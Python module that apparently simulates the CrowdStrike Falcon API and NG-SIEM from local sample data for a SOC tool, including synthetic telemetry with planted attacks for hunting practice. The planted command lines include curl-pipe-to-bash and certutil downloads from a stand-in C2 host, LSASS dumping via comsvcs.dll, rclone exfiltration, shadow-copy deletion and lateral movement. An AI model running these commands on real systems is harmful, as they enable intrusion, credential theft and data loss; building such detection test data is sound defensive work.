"""Sample CrowdStrike API: answers Falcon API operations (the FalconPy Uber-class operation IDs) from the sample database, so the
whole AI SOC — Falcon MCP, direct API lookups, IOC checks, CQL hunts — can be tried without a tenant. Nothing leaves the machine;
operations that would change a tenant are refused.

Used by app.mcp_sample_server (inside the official falcon-mcp server) and by app.cs_api (direct API) in sample-data mode.

NG-SIEM searches run against a small synthetic endpoint telemetry set built from the sample hosts, detections and NDR alerts
(process starts, network connections, DNS requests, logons, persistence) with a few planted attacks, evaluated by the CQL engine
in app.cql — so generated queries return realistic results."""
import hashlib
import json
import sqlite3
import time
from datetime import datetime, timedelta, timezone

from . import config

WRITE_PREFIXES = ("Patch", "Update", "Create", "Delete", "Perform", "RTR_", "BatchActive", "BatchAdmin", "Add", "Remove", "Set")
READ_POSTS = {"PostDeviceDetailsV2", "PostEntitiesAlertsV2", "PostAggregatesAlertsV2", "StartSearchV1"}
SEARCHES = {}


def _db():
    c = sqlite3.connect(config.DB_PATH)
    c.row_factory = sqlite3.Row
    return c


def _ok(resources=None, total=None, **body):
    res = resources if resources is not None else []
    return {"status_code": 200, "headers": {}, "body": {"resources": res, "errors": [],
                                                       "meta": {"pagination": {"total": total if total is not None else len(res), "offset": 0,
                                                                               "limit": len(res)}}, **body}}


def _ids(kw):
    body = kw.get("body") or {}
    v = body.get("ids") or body.get("composite_ids") or kw.get("ids") or []
    return [v] if isinstance(v, str) else list(v)


def _params(kw):
    return {**{k: v for k, v in kw.items() if k not in ("body", "parameters")}, **(kw.get("parameters") or {})}


def _limit(kw, default=100):
    body = kw.get("body") or {}
    try:
        return int(_params(kw).get("limit") or (body.get("limit") if isinstance(body, dict) else None) or default)
    except (TypeError, ValueError):
        return default


def _alert(r):
    raw = json.loads(r["raw"] or "{}")
    sev = {"Critical": 90, "High": 70, "Medium": 50, "Low": 30}.get(r["severity"], 10)
    return {**raw, "composite_id": r["id"], "severity": sev, "severity_name": r["severity"], "display_name": r["name"], "name": r["name"],
            "description": r["description"], "tactic": r["tactic"], "technique": r["technique"], "status": r["status"],
            "created_timestamp": r["created_at"], "updated_timestamp": r["updated_at"], "filename": r["filename"], "cmdline": r["cmdline"],
            "assigned_to_name": r["assigned_to"], "pattern_disposition_description": r["disposition"], "product": r["product"] or "epp",
            "device": {"device_id": r["aid"], "hostname": r["hostname"], "local_ip": r["local_ip"], "external_ip": r["external_ip"],
                       "platform_name": r["platform_name"], "os_version": r["os_version"]}}


def _fql_value(flt, field):
    """The value of field:'x' in a simple FQL filter (enough for the sample)."""
    import re
    m = re.search(rf"{field}:\*?'\*?([^'*]+)\*?'", flt or "")
    return m.group(1).lower() if m else None


def command(operation: str, **kw):  # noqa: C901 - one branch per operation
    if operation.startswith(WRITE_PREFIXES) and operation not in READ_POSTS:
        return {"status_code": 403, "headers": {}, "body": {"resources": [], "errors": [
            {"code": 403, "message": f"Sample data mode: {operation} would change the tenant, so it is not simulated"}]}}
    c = _db()
    try:
        if operation in ("QueryDevicesByFilter", "QueryDevicesByFilterScroll"):
            rows = c.execute("SELECT aid FROM hosts WHERE console_state='active' ORDER BY last_seen DESC").fetchall()
            return _ok([r[0] for r in rows[:_limit(kw)]], total=len(rows))
        if operation in ("PostDeviceDetailsV2", "GetDeviceDetailsV2", "GetDeviceDetails"):
            ids = _ids(kw)
            rows = c.execute(f"SELECT h.aid, r.raw, h.online_state FROM hosts h LEFT JOIN host_raw r ON r.aid=h.aid WHERE h.aid IN ({','.join('?' * len(ids))})", ids).fetchall()
            return _ok([{**json.loads(r["raw"] or "{}"), "device_id": r["aid"], "status": "normal"} for r in rows])
        if operation == "GetQueriesAlertsV2":
            rows = c.execute("SELECT id FROM detections ORDER BY created_at DESC").fetchall()
            return _ok([r[0] for r in rows[:_limit(kw)]], total=len(rows))
        if operation == "PostEntitiesAlertsV2":
            ids = _ids(kw)
            rows = c.execute(f"""SELECT d.*, h.local_ip, h.external_ip, h.platform_name, h.os_version FROM detections d
                                 LEFT JOIN hosts h ON h.aid=d.aid WHERE d.id IN ({','.join('?' * len(ids))})""", ids).fetchall()
            return _ok([_alert(r) for r in rows])
        if operation == "PostAggregatesAlertsV2":
            specs = kw.get("body") or []
            specs = specs if isinstance(specs, list) else [specs]
            out = []
            for s in specs or [{"field": "severity_name", "name": "severity"}]:
                field = {"severity_name": "severity", "tactic": "tactic", "technique": "technique", "status": "status",
                         "device.hostname": "hostname", "assigned_to_name": "assigned_to"}.get(s.get("field"), "severity")
                b = c.execute(f"SELECT COALESCE({field},'') k, COUNT(*) n FROM detections GROUP BY 1 ORDER BY n DESC LIMIT 20").fetchall()
                out.append({"name": s.get("name") or field, "buckets": [{"label": r["k"], "count": r["n"]} for r in b]})
            return _ok(out)
        if operation == "combinedQueryVulnerabilities":
            rows = c.execute("""SELECT s.*, h.platform_name, h.os_version FROM spotlight_vulns s LEFT JOIN hosts h ON h.aid=s.aid
                                ORDER BY s.score DESC LIMIT ?""", (_limit(kw, 50),)).fetchall()
            res = [{"id": r["id"], "aid": r["aid"], "status": r["status"], "created_timestamp": r["created_at"], "updated_timestamp": r["updated_at"],
                    "cve": {"id": r["cve"], "base_score": r["score"], "severity": r["severity"], "exprt_rating": r["exprt"],
                            "exploit_status_label": r["exploit_status"], "description": r["description"], "published_date": r["published"],
                            "vector": r["vector"], "cisa_info": {"is_cisa_kev": bool(r["kev"])}},
                    "host_info": {"hostname": r["hostname"], "local_ip": r["ip"], "platform": r["platform_name"], "os_version": r["os_version"]},
                    "apps": [{"product_name_version": r["product"]}] if r["product"] else [],
                    "remediation": {"entities": [{"action": r["remediation"]}]}} for r in rows]
            return _ok(res, total=c.execute("SELECT COUNT(*) FROM spotlight_vulns").fetchone()[0])
        if operation == "QueryIntelIndicatorEntities":
            want = _fql_value(_params(kw).get("filter"), "indicator")
            return _ok([i for i in _INTEL[operation] if not want or i["indicator"] == want])
        if operation in ("QueryIntelActorEntities", "QueryIntelReportEntities"):
            return _ok(_INTEL[operation])
        if operation in ("indicator_combined_v1", "indicator.combined.v1"):
            want = _fql_value(_params(kw).get("filter"), "value")
            return _ok([i for i in CUSTOM_IOCS if not want or want in i["value"]])
        if operation == "StartSearchV1":
            body = kw.get("body") or {}
            sid = f"sample-{int(time.time() * 1000)}"
            SEARCHES[sid] = body
            for k in list(SEARCHES)[:-50]:
                SEARCHES.pop(k, None)
            return {"status_code": 200, "headers": {}, "body": {"id": sid}}
        if operation == "GetSearchStatusV1":
            p = _params(kw)
            body = SEARCHES.get(p.get("search_id") or p.get("id")) or {}
            from . import cql
            t0 = time.time()
            try:
                events, scanned = cql.evaluate(body.get("queryString") or "", telemetry(c), start=body.get("start"))
            except cql.CqlError as e:
                return {"status_code": 400, "headers": {}, "body": {"errors": [{"code": 400, "message": str(e)}]}}
            return {"status_code": 200, "headers": {}, "body": {"done": True, "cancelled": False, "events": events, "warnings": [],
                                                                "metaData": {"eventCount": len(events), "processedEvents": scanned,
                                                                             "processedBytes": scanned * 900, "timeMillis": int((time.time() - t0) * 1000) + 180,
                                                                             "isAggregate": False, "filterQuery": {"queryString": body.get("queryString")}}}}
        return _ok([])
    finally:
        c.close()


_INTEL = {
    "QueryIntelActorEntities": [
        {"id": 1, "name": "FANCY BEAR (sample)", "slug": "fancy-bear", "short_description": "Sample: state-nexus adversary targeting government and defence.",
         "target_countries": [{"value": "India"}], "target_industries": [{"value": "Government"}], "motivations": [{"value": "Espionage"}]},
        {"id": 2, "name": "SCATTERED SPIDER (sample)", "slug": "scattered-spider", "short_description": "Sample: eCrime adversary using social engineering and SIM swapping.",
         "target_industries": [{"value": "Financial Services"}], "motivations": [{"value": "Criminal"}]},
    ],
    "QueryIntelIndicatorEntities": [
        {"id": "domain_sample-c2.example", "indicator": "sample-c2.example", "type": "domain", "malicious_confidence": "high",
         "labels": [{"name": "ThreatType/C2"}, {"name": "MaliciousConfidence/High"}], "actors": ["SCATTERED SPIDER (sample)"],
         "malware_families": ["SampleRAT"], "published_date": 1790000000},
        {"id": "ip_address_203.0.113.66", "indicator": "203.0.113.66", "type": "ip_address", "malicious_confidence": "high",
         "labels": [{"name": "ThreatType/C2"}], "actors": ["SCATTERED SPIDER (sample)"], "malware_families": ["SampleRAT"], "published_date": 1790000000},
        {"id": "hash_sha256_" + "b" * 64, "indicator": "b" * 64, "type": "hash_sha256", "malicious_confidence": "medium",
         "labels": [{"name": "ThreatType/Ransomware"}], "actors": [], "malware_families": ["SampleLocker"], "published_date": 1790000000},
        {"id": "domain_cdn-update.example", "indicator": "cdn-update.example", "type": "domain", "malicious_confidence": "low",
         "labels": [{"name": "ThreatType/Suspicious"}], "actors": [], "malware_families": [], "published_date": 1790000000},
    ],
    "QueryIntelReportEntities": [
        {"id": 1, "name": "CSA-SAMPLE-001 Ransomware targeting banking (sample)", "short_description": "Sample intelligence report.",
         "created_date": 1790000000},
    ],
}
CUSTOM_IOCS = [
    {"id": "ioc-1", "type": "domain", "value": "sample-c2.example", "action": "prevent", "severity": "high", "description": "Sample: C2 seen in IR-2291",
     "created_on": "2026-09-01T10:00:00Z", "platforms": ["windows", "linux", "mac"]},
    {"id": "ioc-2", "type": "sha256", "value": "b" * 64, "action": "prevent", "severity": "critical", "description": "Sample: ransomware loader",
     "created_on": "2026-09-12T08:30:00Z", "platforms": ["windows"]},
]


# ------------------------------------------------------------------ synthetic endpoint telemetry for NG-SIEM searches
_TEL = {"key": None, "events": []}
BASE_WIN = [("svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p", "services.exe"),
            ("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", '"chrome.exe" --type=renderer', "explorer.exe"),
            ("OUTLOOK.EXE", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", '"OUTLOOK.EXE"', "explorer.exe"),
            ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -NoProfile -File C:\\scripts\\inventory.ps1", "svchost.exe"),
            ("cmd.exe", r"C:\Windows\System32\cmd.exe", "cmd.exe /c ipconfig /all", "explorer.exe"),
            ("teams.exe", r"C:\Users\Public\AppData\Local\Microsoft\Teams\current\Teams.exe", "Teams.exe", "explorer.exe"),
            ("sqlservr.exe", r"C:\Program Files\Microsoft SQL Server\MSSQL15\MSSQL\Binn\sqlservr.exe", "sqlservr.exe -sMSSQLSERVER", "services.exe"),
            ("wmiprvse.exe", r"C:\Windows\System32\wbem\WmiPrvSE.exe", "wmiprvse.exe -Embedding", "svchost.exe")]
BASE_LIN = [("sshd", "/usr/sbin/sshd", "/usr/sbin/sshd -D", "systemd"), ("java", "/usr/bin/java", "java -jar /opt/app/payments.jar", "systemd"),
            ("bash", "/usr/bin/bash", "bash -c /opt/app/healthcheck.sh", "cron"), ("python3", "/usr/bin/python3", "python3 /opt/monitor/agent.py", "systemd"),
            ("nginx", "/usr/sbin/nginx", "nginx: worker process", "nginx")]
DOMAINS = ["login.microsoftonline.com", "update.googleapis.com", "outlook.office365.com", "github.com", "repo.maven.apache.org", "ocsp.digicert.com",
           "teams.microsoft.com", "windowsupdate.com"]
# (host index, platform, file, path, command line, parent, user) — planted activity for hunts to find
PLANTED = [
    (0, "Win", "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "WINWORD.EXE"),
    (0, "Win", "certutil.exe", r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://sample-c2.example/a.bin C:\\Users\\Public\\a.exe", "cmd.exe"),
    (0, "Win", "a.exe", r"C:\Users\Public\a.exe", r"C:\Users\Public\a.exe", "cmd.exe"),
    (1, "Win", "rclone.exe", r"C:\ProgramData\rclone.exe", "rclone.exe copy D:\\Finance mega:backup --transfers 16", "cmd.exe"),
    (1, "Win", "vssadmin.exe", r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "cmd.exe"),
    (2, "Win", "PsExec.exe", r"C:\Tools\PsExec.exe", r"PsExec.exe \\10.20.0.95 -s cmd.exe", "cmd.exe"),
    (2, "Win", "rundll32.exe", r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Temp\l.dmp full", "cmd.exe"),
    (3, "Win", "net.exe", r"C:\Windows\System32\net.exe", 'net group "Domain Admins" /domain', "cmd.exe"),
    (3, "Win", "nltest.exe", r"C:\Windows\System32\nltest.exe", "nltest /domain_trusts /all_trusts", "cmd.exe"),
    (3, "Win", "schtasks.exe", r"C:\Windows\System32\schtasks.exe", 'schtasks /create /tn "Updater" /tr C:\\Users\\Public\\a.exe /sc onlogon', "cmd.exe"),
    (4, "Win", "AnyDesk.exe", r"C:\Users\Public\Downloads\AnyDesk.exe", "AnyDesk.exe --silent", "explorer.exe"),
    (5, "Lin", "curl", "/usr/bin/curl", "curl -s http://sample-c2.example/x.sh | bash", "bash"),
    (5, "Lin", "x", "/tmp/.x/x", "/tmp/.x/x -c 203.0.113.66:4444", "bash"),
    (6, "Win", "mshta.exe", r"C:\Windows\System32\mshta.exe", "mshta.exe http://cdn-update.example/p.hta", "OUTLOOK.EXE"),
    (3, "Win", "whoami.exe", r"C:\Windows\System32\whoami.exe", "whoami /all", "cmd.exe"),
    (1, "Win", "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "powershell.exe Add-MpPreference -ExclusionPath C:\\ProgramData", "cmd.exe"),
    (6, "Win", "wmic.exe", r"C:\Windows\System32\wbem\WMIC.exe", "wmic /node:10.20.0.95 process call create cmd.exe", "cmd.exe"),
]


def _h(*parts):
    return int(hashlib.md5("|".join(map(str, parts)).encode()).hexdigest()[:8], 16)


def telemetry(c):
    """Synthetic events for the sample hosts (rebuilt when the sample database changes)."""
    key = (c.execute("SELECT COUNT(*), MAX(last_seen) FROM hosts").fetchone()[:], c.execute("SELECT COUNT(*) FROM detections").fetchone()[0])
    if _TEL["key"] == key:
        return _TEL["events"]
    now = datetime.now(timezone.utc)
    hosts = [dict(r) for r in c.execute("""SELECT aid, hostname, platform_name, local_ip, connection_ip, last_login_user FROM hosts
                                          WHERE console_state='active' AND COALESCE(hostname,'')<>'' ORDER BY aid LIMIT 160""")]
    ev = []

    def add(h, name, minutes_ago, **f):
        plat = {"Windows": "Win", "Linux": "Lin", "Mac": "Mac"}.get(h.get("platform_name") or "", "Win")
        ev.append({"@timestamp": (now - timedelta(minutes=minutes_ago)).strftime("%Y-%m-%dT%H:%M:%S.000Z"), "#event_simpleName": name,
                   "event_platform": plat, "aid": h["aid"], "ComputerName": h["hostname"], "LocalAddressIP4": h.get("local_ip") or h.get("connection_ip"), **f})

    def user(h):
        return h.get("last_login_user") or ("root" if (h.get("platform_name") == "Linux") else f"user{_h(h['aid']) % 60:02d}")

    for i, h in enumerate(hosts):
        lin = h.get("platform_name") == "Linux"
        pool = BASE_LIN if lin else BASE_WIN
        for k in range(6):
            fn, path, cmd, parent = pool[_h(h["aid"], k) % len(pool)]
            sha = hashlib.sha256(path.encode()).hexdigest()
            add(h, "ProcessRollup2", _h(h["aid"], "p", k) % 10000, FileName=fn, ImageFileName=path, FilePath=path.rsplit("\\" if not lin else "/", 1)[0],
                CommandLine=cmd, ParentBaseFileName=parent, UserName=user(h), SHA256HashData=sha, MD5HashData=hashlib.md5(path.encode()).hexdigest())
        for k in range(3):
            d = DOMAINS[_h(h["aid"], "d", k) % len(DOMAINS)]
            add(h, "DnsRequest", _h(h["aid"], "d", k) % 10000, DomainName=d, RequestType=1)
            add(h, "NetworkConnectIP4", _h(h["aid"], "n", k) % 10000, RemoteAddressIP4=f"52.{_h(d) % 200}.{k}.{_h(h['aid']) % 250}", RemotePort=443,
                LocalPort=49152 + _h(h["aid"], k) % 10000, Protocol=6)
        add(h, "UserLogon", _h(h["aid"], "l") % 10000, UserName=user(h), LogonType=3 if lin else (2 if i % 3 else 3), LogonDomain="CORP",
            RemoteAddressIP4=hosts[(i + 1) % len(hosts)].get("local_ip"))
    for idx, plat, fn, path, cmd, parent in PLANTED:
        cands = [h for h in hosts if (h.get("platform_name") == "Linux") == (plat == "Lin")]
        if not cands:
            continue
        h = cands[idx % len(cands)]
        sha = "b" * 64 if fn == "a.exe" else hashlib.sha256(path.encode()).hexdigest()
        add(h, "ProcessRollup2", 30 + 97 * idx, FileName=fn, ImageFileName=path, FilePath=path.rsplit("\\" if plat == "Win" else "/", 1)[0],
            CommandLine=cmd, ParentBaseFileName=parent, UserName=user(h), SHA256HashData=sha, MD5HashData=hashlib.md5(path.encode()).hexdigest())
        if "sample-c2" in cmd or "203.0.113.66" in cmd:
            add(h, "DnsRequest", 29 + 97 * idx, DomainName="sample-c2.example", RequestType=1)
            add(h, "NetworkConnectIP4", 28 + 97 * idx, RemoteAddressIP4="203.0.113.66", RemotePort=4444 if "4444" in cmd else 80, LocalPort=50123, Protocol=6)
        if fn == "a.exe":
            add(h, "DnsRequest", 20 + 97 * idx, DomainName="k3j4h5g6f7d8s9a0q1w2e3r4.xyz", RequestType=1)
            add(h, "NetworkConnectIP4", 19 + 97 * idx, RemoteAddressIP4="203.0.113.66", RemotePort=443, LocalPort=50124, Protocol=6)
        if "cdn-update" in cmd:
            add(h, "DnsRequest", 29 + 97 * idx, DomainName="cdn-update.example", RequestType=1)
        if fn == "schtasks.exe":
            add(h, "ScheduledTaskRegistered", 25 + 97 * idx, TaskName="\\Updater", TaskExecCommand=r"C:\Users\Public\a.exe", TaskAuthor=f"CORP\\{user(h)}")
            add(h, "AsepValueUpdate", 24 + 97 * idx, RegObjectName=r"\REGISTRY\USER\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run",
                RegValueName="Updater", RegStringValue=r"C:\Users\Public\a.exe")
        if fn in ("PsExec.exe", "wmic.exe"):
            add(h, "NetworkConnectIP4", 26 + 97 * idx, RemoteAddressIP4="10.20.0.95", RemotePort=445, LocalPort=50200, Protocol=6)
        if fn == "rclone.exe":
            add(h, "NetworkConnectIP4", 26 + 97 * idx, RemoteAddressIP4="31.216.144.5", RemotePort=443, LocalPort=50300, Protocol=6)
            add(h, "DnsRequest", 27 + 97 * idx, DomainName="g.api.mega.co.nz", RequestType=1)
    if hosts:  # password spraying against one server
        tgt = hosts[min(7, len(hosts) - 1)]
        for k in range(40):
            add(tgt, "UserLogonFailed2", 300 + k, UserName=["administrator", "admin", "svc_backup", "j.smith"][k % 4], LogonType=3,
                RemoteAddressIP4="10.99.4.23")
        for k in range(4):
            add(hosts[(9 + k) % len(hosts)], "UserLogon", 400 + k, UserName="svc_backup", LogonType=10, RemoteAddressIP4="10.99.4.23", LogonDomain="CORP")
    for d in c.execute("""SELECT d.aid, d.created_at, d.filename, d.cmdline, d.raw FROM detections d ORDER BY d.created_at DESC LIMIT 300"""):
        h = next((x for x in hosts if x["aid"] == d["aid"]), None)
        if not h or not d["filename"]:
            continue
        raw = json.loads(d["raw"] or "{}")
        try:
            ago = max(1, int((now - datetime.fromisoformat(d["created_at"].replace("Z", "+00:00"))).total_seconds() // 60))
        except (TypeError, ValueError):
            ago = 60
        add(h, "ProcessRollup2", ago, FileName=d["filename"], CommandLine=d["cmdline"] or d["filename"], UserName=user(h),
            ParentBaseFileName=(raw.get("parent_details") or {}).get("filename") or "explorer.exe", SHA256HashData=raw.get("sha256") or "",
            ImageFileName=raw.get("filepath") or d["filename"])
    for n in c.execute("SELECT created_at, src_ip, dst_ip FROM ndr_alerts ORDER BY created_at DESC LIMIT 200"):
        h = next((x for x in hosts if x.get("local_ip") == n["src_ip"] or x.get("connection_ip") == n["src_ip"]), None)
        if h and n["dst_ip"]:
            add(h, "NetworkConnectIP4", _h(n["created_at"]) % 9000, RemoteAddressIP4=n["dst_ip"], RemotePort=443, LocalPort=51000, Protocol=6)
    ev.sort(key=lambda e: e["@timestamp"], reverse=True)
    _TEL.update(key=key, events=ev)
    return ev
